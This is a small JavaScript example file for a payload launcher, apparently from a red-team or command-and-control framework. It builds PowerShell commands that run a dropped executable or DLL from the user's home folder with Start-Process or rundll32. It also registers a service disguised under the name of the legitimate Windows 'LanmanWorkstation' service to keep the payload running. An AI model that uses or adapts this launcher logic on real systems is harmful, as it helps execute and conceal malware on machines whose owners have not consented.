/**
 * Example argument JS file for the "ps-all" launcher
 *  NB: SHELLCODE is not supported in this launcher, as it requires different type of handling. Take a look at the default.examples for SHELLCODE.
 */
const payloadType = payload.configuration.type;
const timestamp = new Date().getTime();
const execution = {
  EXECUTABLE: (filename) => `Start-Process $HOME\\${filename}`,
  DEBUG_EXECUTABLE: (filename) => `Start-Process $HOME\\${filename}`,
  SERVICE: (filename) =>
    `New-Service -Name LanmanWorkstation${timestamp} -BinaryPathName (Resolve-Path $HOME\\${filename}); Start-Service -Name LanmanWorkstation${timestamp}`,
  DLL: (filename) => {
    if (payload.configuration.dllMethodName) {
      return `rundll32.exe $HOME\\${filename},${payload.configuration.dllMethodName}`;
    } else {
      return `rundll32.exe $HOME\\${filename},bob`;
    }
  },
};
execution[payloadType](argumentsPluginInterface["filename"]); //return correct execution command
